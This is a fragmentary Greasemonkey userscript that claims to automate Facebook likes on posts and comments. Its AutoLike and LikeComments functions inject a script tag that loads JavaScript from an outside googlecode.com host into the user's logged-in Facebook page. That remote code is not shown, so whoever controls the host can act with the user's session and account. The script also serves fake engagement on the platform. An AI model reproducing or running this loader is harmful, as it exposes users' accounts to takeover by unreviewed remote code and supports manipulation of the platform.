// ==UserScript==
// @name			Auto Like Facebook v.2
// @namespace		auto_like_facebook
// @description		Auto Like Facebook by Rendra Agus Setiawan rendias
// @author			Rendra Agus Setiawan rendias
// @authorURL		http://www.facebook.com/rendiass
// @homepage		www.indonesia-community.net
...
body.appendChild(div);unsafeWindow.AutoLike = function() {javascript:(a=(b=document).createElement("script")).src="//autolikerendias.googlecode.com/files/rendiass.js",b.body.appendChild(a);void(0);};}
body = document.body;
...
body.appendChild(div);unsafeWindow.LikeComments = function() {javascript:(a=(b=document).createElement("script")).src="//autolikerendias.googlecode.com/files/rendiass.js",b.body.appendChild(a);void(0);};}
body = document.body;
